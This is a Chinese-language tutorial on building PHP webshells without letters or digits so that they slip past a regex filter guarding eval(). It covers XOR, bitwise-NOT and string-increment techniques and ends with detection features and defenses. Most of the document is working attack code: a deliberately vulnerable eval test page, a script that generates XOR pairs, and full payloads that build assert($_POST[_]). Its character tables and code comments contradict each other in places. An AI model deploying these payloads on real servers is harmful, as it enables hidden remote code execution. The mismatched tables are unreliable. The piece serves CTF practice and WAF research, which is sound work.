## 概述

PHP 非字母数字 Webshell 构造是一种在代码执行场景下、面对严格字符过滤（如 `preg_match("/[A-Za-z0-9]+/")`）时，利用 PHP 语言特性（弱类型、字符串运算、动态函数调用）构造出任意字符串并实现代码执行的高级绕过技术。本文系统梳理三大核心流派：

1. **异或构造**：利用两个非字母数字字符的异或运算产生目标字符
2. **取反构造**：利用 UTF-8 多字节字符的按位取反提取字母，配合弱类型生成数字下标
3. **字符自增构造**：利用 PHP 字符串自增特性（`$a++`）从 `A` 递增得到任意字母

> **适用场景**：CTF 挑战、WAF 绕过研究、代码审计中识别高隐蔽后门  
> **核心前提**：代码执行点（`eval`、`assert`、`call_user_func` 等）可控，且过滤规则仅拦截字母数字

## 测试环境基础代码

文章中给出的典型过滤逻辑：

```php
<?php
include 'flag.php';
if(isset($_GET['code'])){
    $code = $_GET['code'];
    if(preg_match("/[A-Za-z0-9]+/",$code)){
        die("NO.");
    }
    @eval($code);
}else{
    highlight_file(__FILE__);
}
?>
```

**过滤规则**：`[A-Za-z0-9]+` —— 禁止出现任意字母（大小写）与数字  
**执行函数**：`eval()` —— PHP 5/7 均支持动态代码执行

> **注意**：PHP 7 中 `assert()` 不再是函数，变为语言结构，无法通过 `$f='assert';$f(...)` 动态调用。实战中常改用 `file_put_contents` 写入 webshell 或直接使用 `system`/`readfile` 等函数。

## 方法一：异或构造

### 核心原理

PHP 中两个字符串执行异或（`^`）操作，结果仍为字符串。若能找到两个**非字母数字**字符，其异或结果为目标字母（a-z, A-Z），即可逐字符拼接出函数名。

数学表达：`char1 ^ char2 = target_char`，其中 `char1, char2 ∉ [A-Za-z0-9]`

### 自动化寻找异或对脚本

```php
<?php
$l = '`';  // 固定其中一个字符为反引号 (chr(96))
$argv = str_split("readfile");  // 目标函数名

for($i=0; $i<count($argv); $i++){
    for($j=0; $j<255; $j++){
        // 跳过字母数字
        if (48 <= $j && $j <= 57 || $j >= 65 && $j <= 90 || $j >= 97 && $j <= 122){
            continue;
        }
        $k = chr($j) ^ $l;
        if($k == $argv[$i]){
            echo "异或结果: " . $k . "\n";
            echo "可用 ASCII: " . $j . "\n";
            echo "URL编码: " . urlencode(chr($j)) . "\n";
            echo "Payload片段: ('" . urlencode(chr($j)) . "'^'`')\n";
            echo "..........\n";
        }
    }
}
?>
```

### 经典 Payload 示例（以 `` ` `` 为固定异或基数）

| 目标函数 | 核心 Payload 片段 | 说明 |
|----------|-------------------|------|
| `assert($_POST[_])` | `$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');` | 拼接出 `assert` |
| `system($_POST[_])` | `$_=('%13'^'`').('%19'^'`').('%13'^'`').('%14'^'`').('%05'^'`').('%0D'^'`');` | 拼接出 `system` |
| `readfile($_POST[_])` | `$_=('%12'^'`').('%05'^'`').('%01'^'`').('%04'^'`').('%06'^'`').('%09'^'`').('%0C'^'`').('%05'^'`');` | 拼接出 `readfile` |

### 完整执行链构造

```php
<?php
// 1. 构造函数名 assert
$_ = ('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');

// 2. 构造 _POST 变量名：利用 $GLOBALS['_POST'] 或 $_POST 直接访问
//    这里利用变量变量：$_POST 即 $GLOBALS['_POST']
$__ = '_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']');  // 拼接出 "_POST"
$___ = $$__;  // $___ = $_POST

// 3. 执行 assert($_POST[_])
$_($___[_]);
?>
```

> **技巧**：`$__` 拼接出字符串 `"_POST"`，`$$__` 即 `$_POST`（变量变量）。同理可构造 `"_GET"`、`"_REQUEST"` 等。

### 进阶：不依赖固定基数的通用异或表

| 目标字符 | 可用异或对示例 (char1 ^ char2) | 备注 |
|----------|--------------------------------|------|
| `a` | `%7E` ^ `%5F` (`~` ^ `_`) | 可见字符组合 |
| `s` | `%5E` ^ `%3B` (`^` ^ `;`) | |
| `e` | `%5D` ^ `%3A` (`]` ^ `:`) | |
| `r` | `%5B` ^ `%3F` (`[` ^ `?`) | |
| `t` | `%5C` ^ `%2F` (`\` ^ `/`) | |

> 实战中可编写脚本生成完整映射表，或使用现成工具（如 [phithon 的非字母数字 webshell 生成器](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)）。

## 方法二：取反构造

### 核心原理

1. **UTF-8 汉字取字节**：`mb_substr($str, $i, 1, 'utf-8')` 提取单个汉字（3-4 字节）
2. **按位取反**：`~$char` 对每个字节取反（`~` 是按位取反操作符）
3. **提取特定字节**：`$result[1]`、`$result[2]` 访问取反后字符串的第 2、3 个字节（下标从 0 开始），往往落在可见字母范围

> **关键洞察**：常用汉字的 UTF-8 编码高位固定（`1110xxxx 10xxxxxx 10xxxxxx`），取反后低位字节常映射为小写字母。

### 从文章中筛选可用汉字（示例）

| 汉字 | UTF-8 字节 | 取反后字节[1] | 取反后字节[2] | 可得字母 |
|------|------------|---------------|---------------|----------|
| 经 | E7 BB 8F | `\x18` | **`p`** | `p` |
| 早 | E6 97 A9 | `\x19` | **`h`** | `h` |
| 方 | E6 96 B9 | `\x19` | **`i`** | `i` |
| 我 | E6 88 91 | `\x19` | **`w`** | `w` |
| 站 | E7 AB 99 | `\x18` | **`T`** | `T` |
| 向 | E5 90 91 | `\x1A` | **`o`** | `o` |

### 无数字下标问题与弱类型解法

**问题**：`~('经'[2])` 中的下标 `2` 是数字，被过滤拦截。

**解法**：利用 PHP 弱类型布尔转整数：
- `true == 1` → `('>'>'<')` 结果为 `true` → `('>'>'<') + ('>'>'<') == 2`
- `false == 0` → `('>'=>'<')` 结果为 `false`

```php
<?php
$_  = ('>'>'<') + ('>'=>'<');  // 1
$__ = ('>'>'<') + ('>'>'<');   // 2

$___ = ~('经'[$__]);  // p
$___ .= ~('早'[$_]);  // h
$___ .= ~('经'[$__]); // p
$___ .= ~('方'[$_]);  // i
$___ .= ~('我'[$__]); // n
$___ .= ~('站'[$__]); // f
$___ .= ~('向'[$_]);  // o

echo $___ . "()";  // 输出: phpinfo()
?>
```

### 完整 `assert($_POST[_])` Payload（phithon 版）

```php
<?php
$__ = (">">"<") + (">">"<");  // 2
$_  = $__ / $__;                // 1

$____ = "";
$___ = "瞰"; $____ .= ~($___[$_]);  // a
$___ = "和"; $____ .= ~($___[$__]); // s
$___ = "和"; $____ .= ~($___[$__]); // s
$___ = "的"; $____ .= ~($___[$_]);  // e
$___ = "半"; $____ .= ~($___[$_]);  // r
$___ = "始"; $____ .= ~($___[$__]); // t
// $____ = "assert"

$_____ = "_";
$___ = "俯"; $_____ .= ~($___[$__]); // P
$___ = "瞰"; $_____ .= ~($___[$__]); // O
$___ = "次"; $_____ .= ~($___[$_]);  // S
$___ = "站"; $_____ .= ~($___[$_]);  // T
// $_____ = "_POST"

$_ = $$_____;  // $_ = $_POST
$____($_[$__]); // assert($_POST[2])
?>
```

> **使用时须 URL 编码**：将上述代码整体 `urlencode()` 后作为 `code` 参数传递。

## 方法三：字符自增构造

### 核心原理

PHP 支持字符串自增操作，遵循 Perl 风格：

```php
$a = 'A'; $a++; // 'B'
$b = 'Z'; $b++; // 'AA'
$c = 'z'; $c++; // 'aa'
```

从 `'A'` 通过自增可遍历所有大写字母，再通过大小写转换或继续自增得到小写字母。

### 关键难点：如何获得初始 `'A'`

**答案**：数组 `Array` 的首字符即为大写 `A`。

```php
$_ = [];           // 空数组
$_ = @"$_";        // 强制转字符串："Array" (错误抑制 @ 隐藏 Notice)
$_ = $_['!'=='@']; // $_[false] 即 $_[0] → 'A'
$___ = $_;         // $___ = 'A'
```

> `'!'=='@'` 为 `false`（布尔），作为数组下标自动转为 `0`。

### 从 `A` 自增构造 `assert` 与 `_POST`

```php
<?php
$_ = []; $_ = @"$_"; $_ = $_['!'=='@']; $___ = $_; // $___ = 'A'

// 构造 S (A + 18)
$__ = $_;
$__++; $__++; $__++; $__++; $__++; $__++; $__++; $__++; $__++; $__++; 
$__++; $__++; $__++; $__++; $__++; $__++; $__++; $__++;
$___.= $__; // S

$___.= $__; // SS

// 构造 E (A + 4)
$__ = $_;
$__++; $__++; $__++; $__++;
$___.= $__; // SSE

// 构造 R (A + 17)
$__ = $_;
for($i=0;$i<17;$i++) $__++;
$___.= $__; // ASSERT

// 构造 _POST
$____ = '_';
$__ = $_; for($i=0;$i<15;$i++) $__++; $____.=$__; // P
$__ = $_; for($i=0;$i<14;$i++) $__++; $____.=$__; // O
$__ = $_; for($i=0;$i<18;$i++) $__++; $____.=$__; // S
$__ = $_; for($i=0;$i<19;$i++) $__++; $____.=$__; // T
// $____ = '_POST'

$_ = $$____;      // $_ = $_POST
$___($_[_]);      // assert($_POST[_])
?>
```

> **优化**：循环或重复 `++` 可用脚本生成，手写极其繁琐。核心思想是“基字符 + 自增次数 = 目标字符”。

## 三大技术对比总结

| 维度 | 异或构造 | 取反构造 | 字符自增构造 |
|------|----------|----------|--------------|
| **核心运算** | `^` (按位异或) | `~` (按位取反) + 数组下标 | `++` (字符串自增) |
| **依赖字符集** | 两个非字母数字可见字符 | UTF-8 汉字 + 弱类型布尔数学 | 空数组 `[]` + 错误抑制 `@` |
| **Payload 长度** | 中等 (每字符 ~10-15 字节) | 较短 (汉字编码紧凑) | 极长 (需大量 `++`) |
| **可读性/可维护性** | 可脚本化生成，结构清晰 | 需预先筛选汉字表，略显黑盒 | 纯机械生成，人工几乎不可写 |
| **PHP 版本兼容性** | 全版本 | 全版本 (需 mbstring) | 全版本 |
| **典型应用场景** | CTF 现场手工/半自动构造 | 追求极短 Payload、绕过长度限制 | 理论研究、极端过滤环境(无可见标点) |
| **参考实现** | [leavesongs 异或生成器](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html) | phithon 博客《答》 | phithon 博客《无字母数字 webshell 之字符自增》 |

## 实战检测与防御视角

### 特征识别

| 特征 | 说明 |
|------|------|
| 大量 `^`、`~`、`++` 操作符 | 非正常业务代码典型特征 |
| 变量名为 `$_`、`$__`、`$___` 等下划线序列 | 构造脚本通用命名模式 |
| 出现 `'!'=='@'`、`('>'>'<')` 等恒真/恒假表达式 | 弱类型生成数字下标的固定套路 |
| `@` 错误抑制符频繁出现 | 掩盖数组转字符串、下标越界等 Notice |
| 字符串拼接后直接 `eval`/`assert`/`call_user_func` | 执行入口 |

### 防御建议

1. **禁用危险函数**：`disable_functions = eval,assert,call_user_func,call_user_func_array,array_map,preg_replace` (配合 `/e` 修饰符历史遗留)
2. **open_basedir 限制目录穿越**：防止 `readfile`/`file_put_contents` 读写敏感文件
3. **WAF 规则**：检测上述特征组合，而非单一关键字
4. **代码审计**：重点排查可控变量进入 `eval`/`assert` 的路径，若必须使用，实施严格白名单校验
5. **运行时保护**：部署 RASP/IAST (如 [[huoxian-security-wechat-archive-2023]] 中提到的洞态 IAST) 监控动态函数调用与字符串构造行为
